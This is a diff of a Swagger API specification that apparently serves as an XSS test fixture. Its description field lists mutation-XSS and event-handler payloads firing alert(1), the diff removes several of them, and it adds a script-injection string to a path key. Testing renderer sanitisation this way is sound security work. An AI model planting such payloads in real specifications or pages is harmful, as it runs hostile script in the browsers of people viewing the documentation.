@@ -2,8 +2,6 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
-    <math><mtext><table onLoad="alert(1)"><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
     <img src onerror=alert(1)>
     <img id=x tabindex=1 onfocusin=alert(1)></img>
     <img id=x tabindex=1 onfocus=alert(1)></img>
@@ -13,7 +11,6 @@ info:
     <style>@keyframes x{}</style><img style="animation-name:x" onwebkitanimationstart="alert(1)"></img>
     <a onmousehover="confirm(document.domain)">xss</a><b onload>bold text</b>
     <b id=x tabindex=1 onfocusin=alert(1)></b>
-    <style>@keyframes slidein {}</style><b style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></b>
   version: production
 basePath: /JSSResource/
 produces:
@@ -34,7 +31,7 @@ paths:
         - accounts
       operationId: findAccounts
       summary: <a href="">Finds</a> all accounts
-  '/accounts/groupid/{id}':
+  '/accounts/groupid/{id}"><<script>alert(1)</script>':
     delete:
       parameters:
         - description: |
